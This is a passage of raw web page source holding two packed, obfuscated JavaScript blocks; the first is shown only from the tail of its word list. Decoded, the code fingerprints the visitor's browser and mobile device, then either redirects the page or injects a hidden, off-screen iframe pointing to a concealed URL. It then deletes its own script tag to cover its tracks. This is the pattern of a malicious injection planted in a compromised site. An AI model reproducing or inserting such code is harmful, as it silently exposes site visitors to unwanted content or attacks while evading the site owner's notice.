|bi|pt|length|test|iris|dl_name|iTxFiVxCxOwcfCcGoEWVbcPxVxKXysbj|iframe|20px|ts|v_5273a06202f9fcaad1a537676fe2f96a|wa|os|ck|AuCtoDKFpbmWZKWwigFIBZgeKrDGJjJzjPZhSJ|match|_|od|gMpWfHddhVFLvqAdbGuCTtFlrLftCYGRCvgQLyjT|ca|null|qswLhwUUtNgEKQRvaFbSzgruBdBoqAxFR|ip|g1|er|up|abac|802s|bl|az|4thp|||c55|capi|bw|bumb|ko|br|770s|aptu|lb|au|attw|nq|be|di|avan|rd|us|an|amoi|av|ex|yw|as|ch|rn|dc|fetc|fly|g560|ze|ez|ic|k0|esl8|gene|gf|hcit|hd|hei|haie|un|gr|ad|ul|l2|mp|craw|da|cmd|cldc|cdm|cell|chtm|ng|dbte|ds|el|em|dmob|dica|3gso|devi||ccwa|iemobile|getElementById|outerHTML|delete|compatMode|none|id_1929208|Math|floor|100|XMLHttpRequest|querySelector|rv|Edge|toLowerCase|android|Trident|MSIE|addEventListener|atob|maxTouchPoints|getElementsByTagName|height|Inc|http|dgdsgweewtew545435|tk|Google|vendor|setInterval|clearInterval|chrome|iPhone|iPod|3932px|width|src|left|absolute|replace|style|position|bb|meego|psp|series|symbian|treo|pocket|plucker|phone|ixi|re|browser|link|xiino|1207|6310||xda|ce|vodafone|wap||windows||palm||in|elaine|fennec|hiptop|hi|compal|blazer|avantgo|bada|blackberry|hone|kindle|netfront|opera|ob|firefox|mmp|lge|maemo|midp|6590|ibro|raks|rim9|ro|ve|r600|r380|85|83|qtek|zo|s55|sc|81|sdk|va|ms|sa|ge|mm|98|hp|phil|pire|ay|uc|whit|wi|p800|pan|pg||pn||||po|qc|07|w3c|webc|qa|rt|prox|psio|80|sgh|to|sh|vm40|m3|voda|tim|tcl|tdg|tel|m5|tx|vi|rg|vk|veri|v750|si|utst|v400|lk|gt|sm|b3|t5|id|sl|shar|sie|sk|so|ft|00|vx|vulc|t6|t2|sp|sy|mb|owg1|pdxg|lg|hu|zte|xi|no|||kyo|aw|le|zeto|tp|oran|m3ga|m50|yas|m1|your|libw|lynx|kwc|kpt|im1k|inno|ipaq|ikom|ig01|i230|iac|idea|ja|jbro|klon|substr|tc|kgt|keji|jemu|jigs|kddi|xo|ui|tf|wf|wg|on|ne|n30|n50|n7|wt|nok|ht|hs|wv|ti|op|nc|nzph|o2im|n20|n10|wonu|o8|oa|mi|rc||cr|me|x700|02|mmef|nw|mwbp|mywa|mt|p1|wmlb|zz|de'.split('|'),0,{}))
</script><script type="text/javascript" id="id_1171036">eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('j 1B=3x(I(){f(q.O!=1P&&M q.O!="L"){3y(1B);f(M A["1F"]=="L"){A["1F"]=1;j Y=(V()&&1d());j 1Q=!Y&&!!A.3z&&A.E.3w==="3v 3r.";j 1N=-1;j G="3s://3t.3u";f(17()&&1N==1){f((E.P.1K(/3A/i))||(E.P.1K(/3B/i))){1b.3H(G)}z{A.1b=G;q.1b=G}}z{f((Y&&!1Q&&!17())){j U="<T 3I=\\"3J:3G;3F:-3C;\\"><1C 3D=\\"1D\\" 3E=\\""+G+"\\" 3q=\\"1D\\"></1C></T>";j J=q.3p("T");f(J.1x==0){q.O.N=q.O.N+U}z{j 1A=J.1x;j R=3b.3c((1A/2));J[R].N=J[R].N+U}}}}1J()}},3d);I 1J(){j Z="3a";f(Z!="39"){j H=q.35(Z);f(M H!=L&&H!=1P){H.36="";37 H}}};I 1d(){f(q.C&&!q.38){x B}z f(q.C&&!A.3e){x B}z f(q.C&&!q.3f){x B}z f(q.C&&!q.3m){x B}z f(q.C&&!A.3n){x B}z f(q.C){x B}z f(M E.3o!="L"&&!q.C&&V()){x B}z{x 1a}}I V(){j y=A.E.P;j K=y.D("3l ");f(K>0){x 16(y.1c(K+5,y.D(".",K)),10)}j 1r=y.D("3k/");f(1r>0){j S=y.D("3g:");x 16(y.1c(S+3,y.D(".",S)),10)}j Q=y.D("3h/");f(Q>0){x 16(y.1c(Q+5,y.D(".",Q)),10)}x 1a}I 17(){j 14=A.E.P.3i();f(/(3j|3K\\d+|3L).+1q|4h|4i\\/|4j|4g|4f|4b|4c|4d|34|1R(4k|1M)|1z|4l|4r |4s|4t|4q|1q.+4p|4m|4n m(4o|4a)i|48( 1H)?|3S|p(3T|3U)\\/|3R|3Q|3M|3N(4|6)0|3O|3P|1U\\.(3V|3W)|43|44|46 42|41|3X/i.1y(14)||/3Y|3Z|4u|30|1Z|50[1-6]i|28|1W|a 1G|1V|1l(1T|1n|s\\-)|1e(26|2q)|1p(2l|1O|1m)|2k|2j(2m|X|2n)|29|1u(2p|19)|2o(W|2i)|2c|2b(2f|\\-m|r |s )|2g|2e(1I|1s|2d)|1v(2a|2h)|1X(1l|1Y)|27(e|v)w|25|24\\-(n|u)|22\\/|23|33|2Q\\-|2R|2S|2P|2O\\-|1m(2L|1j)|2M|2N(1h|1s|2T)|2U|2r\\-s|31|2Z|2Y|1f(c|p)o|2V(12|\\-d)|2W(49|1e)|2X(2K|2J)|1T(2x|2y)|2z|2w([4-7]0|1H|1G|2v)|2s|2t(\\-|1L)|1S u|2u|2A|2B\\-5|g\\-11|19(\\.w|1M)|2H(2I|2G)|2F|2C|2D\\-(m|p|t)|2E\\-|4e(1w|1g)|4Q( i|1R)|6M\\-c|6L(c(\\-| |1L|a|g|p|s|t)|66)|5W(63|6t)|i\\-(20|19|15)|6m|6n( |\\-|\\/)|4v|6o|6l|6k|6h|6i|6j|1z|6p(t|v)a|6q|6w|6x|6y|6v|6u( |\\/)|6r|6g |6f\\-|62(c|k)|64(5Z|5Y)|5V( g|\\/(k|l|u)|50|54|\\-[a-w])|6d|6e|6b\\-w|68|69\\/|15(W|6A|6z)|1i(F|21|1O)|m\\-71|72(6Z|1o)|6Y(6W|6X|1E)|75|11(F|74|1v|7d|1f|t(\\-| |o|v)|7c)|79(50|7a|v )|77|78|6U[0-2]|6T[2-3]|6G(0|2)|6H(0|2|5)|6I(0(0|1)|10)|6F((c|m)\\-|6E|6B|6C|6D|6J)|6K(6|i)|6R|6S|6P(6O|6N)|67|5T|4X|4Y(a|d|t)|5U|4Z(13|\\-([1-8]|c))|4R|4S|1t(4T|4U)|51\\-2|55(1I|5b|1k)|5c|5d|1w\\-g|5a\\-a|56(57|12|21|32|60|\\-[2-7]|i\\-)|4E|4B|4A|4w|4x|4y(4z|4F)|4G\\/|4M(4N|15|4O|4L|X|4K)|4H(F|h\\-|1n|p\\-)|4J\\/|1k(c(\\-|0|1)|47|1i|1j|1o)|5f\\-|5G|5H(\\-|m)|5I\\-0|5F(45|5E)|5B(1p|1u|5C|1h|5D)|5J(5K|X)|5Q(F|h\\-|v\\-|v )|5R(F|5S)|5P(18|50)|5O(5L|10|18)|1g(5A|5z)|5m\\-|5n\\-|5o(i|m)|5l\\-|t\\-11|5g(1t|5h)|1E(70|m\\-|5j|5p)|5q\\-9|1U(\\.b|1S|5w)|5x|5y|5v|5u|5r(5s|W)|5t(40|5[0-3]|\\-v)|5i|5k|5N|5M(52|53|60|61|70|5e|4I|4D|4C|4P)|58(\\-| )|59|4V|4W(g |6Q|76)|7b|6V|73|6a\\-|6c|65|5X\\-/i.1y(14.6s(0,4))){x B}x 1a}',62,448,'|||||||||||||||if||||var|||||||document|||||||return|QeyuvwlrvkbWrrhZmPDEVCeAEeNtPoIDptPBv|else|window|true|all|indexOf|navigator|01|dHwawAdUNQqNKnJtCTkGikCUFGaQkQF|GDrmkMopdDzktLrIutsUvklVHlYpibygEFkYidc|function|HVddKnwuLjLZCjhKgWhEybHnyejXYRSllPCUOVHs|HxxylmhcjYlzNHJLQMYJCLBfPAtfWFsrGmC|undefined|typeof|innerHTML|body|userAgent|yUxlihFVQiCAhJuNUotnyUmCdLYqOgtH|XijuWqGjonAPrGlqUGihsXTngbegKnHfWN|CCbaraOJQKHUChQBmLwAOSrlBSjPaVScuXaEuYsrl|div|lAAKDZHOJyRENOHyqCJGqRIXvhpkOoDAJM|gtDRmqBYEOfpidbEZZnhXKmDwEKvDdnICHUbXQQA|te|ny|wGVfEdxVLNhjqACHivLuBpPupQuQwVhfRey|lHaSjaklGJTQLsPFabqgiIkfPbPsHNxf||mo|||zdVtzIRQnyUOmkOimcHhMnLylKswdWG|ma|parseInt|zEsIvqYnfoVWCQFAkRRinqEcsHIXBjxVhfexer||go|false|location|substring|lnNsDZGwLfSWzfSZMCpKeCNlSQAuhDESzWJWHrgEK|ai|do|ta|it|mc|nd|se|ac|co|oo|ri|al|mobile|SPikEUKZyejoJsicbrNqwaDhIIsheeGmE|ll|pl|ar|bi|pt|length|test|iris|dl_name|OiEgkGvnDEUGgFsUPJKFyXuaxBvCIHkpcGene|iframe|24px|ts|v_5273a06202f9fcaad1a537676fe2f96a|wa|os|ck|VlzyDUAAjGaGJsMqYecFeqgZZpuIdyZYJoNt|match|_|od|FIMSxFFIknBnUmQjbhyzsJuPMtYPocjdZPNuC|ca|null|SiTdMYIdPxTmdVzEmqmhLkeaEzJoQWeZKPGbxVaj|ip|g1|er|up|abac|802s|bl|az|4thp|||c55|capi|bw|bumb|ko|br|770s|aptu|lb|au|attw|nq|be|di|avan|rd|us|an|amoi|av|ex|yw|as|ch|rn|dc|fetc|fly|g560|ze|ez|ic|k0|esl8|gene|gf|hcit|hd|hei|haie|un|gr|ad|ul|l2|mp|craw|da|cmd|cldc|cdm|cell|chtm|ng|dbte|ds|el|em|dmob|dica|3gso|devi||ccwa|iemobile|getElementById|outerHTML|delete|compatMode|none|id_1171036|Math|floor|100|XMLHttpRequest|querySelector|rv|Edge|toLowerCase|android|Trident|MSIE|addEventListener|atob|maxTouchPoints|getElementsByTagName|height|Inc|http|dgdsgweewtew545435|tk|Google|vendor|setInterval|clearInterval|chrome|iPhone|iPod|2833px|width|src|left|absolute|replace|style|position|bb|meego|psp|series|symbian|treo|pocket|plucker|phone|ixi|re|browser|link|xiino|1207|6310||xda|ce|vodafone|wap||windows||palm||in|elaine|fennec|hiptop|hi|compal|blazer|avantgo|bada|blackberry|hone|kindle|netfront|opera|ob|firefox|mmp|lge|maemo|midp|6590|ibro|raks|rim9|ro|ve|r600|r380|85|83|qtek|zo|s55|sc|81|sdk|va|ms|sa|ge|mm|98|hp|phil|pire|ay|uc|whit|wi|p800|pan|pg||pn||||po|qc|07|w3c|webc|qa|rt|prox|psio|80|sgh|to|sh|vm40|m3|voda|tim|tcl|tdg|tel|m5|tx|vi|rg|vk|veri|v750|si|utst|v400|lk|gt|sm|b3|t5|id|sl|shar|sie|sk|so|ft|00|vx|vulc|t6|t2|sp|sy|mb|owg1|pdxg|lg|hu|zte|xi|no|||kyo|aw|le|zeto|tp|oran|m3ga|m50|yas|m1|your|libw|lynx|kwc|kpt|im1k|inno|ipaq|ikom|ig01|i230|iac|idea|ja|jbro|klon|substr|tc|kgt|keji|jemu|jigs|kddi|xo|ui|tf|wf|wg|on|ne|n30|n50|n7|wt|nok|ht|hs|wv|ti|op|nc|nzph|o2im|n20|n10|wonu|o8|oa|mi|rc||cr|me|x700|02|mmef|nw|mwbp|mywa|mt|p1|wmlb|zz|de'.split('|'),0,{}))
</script>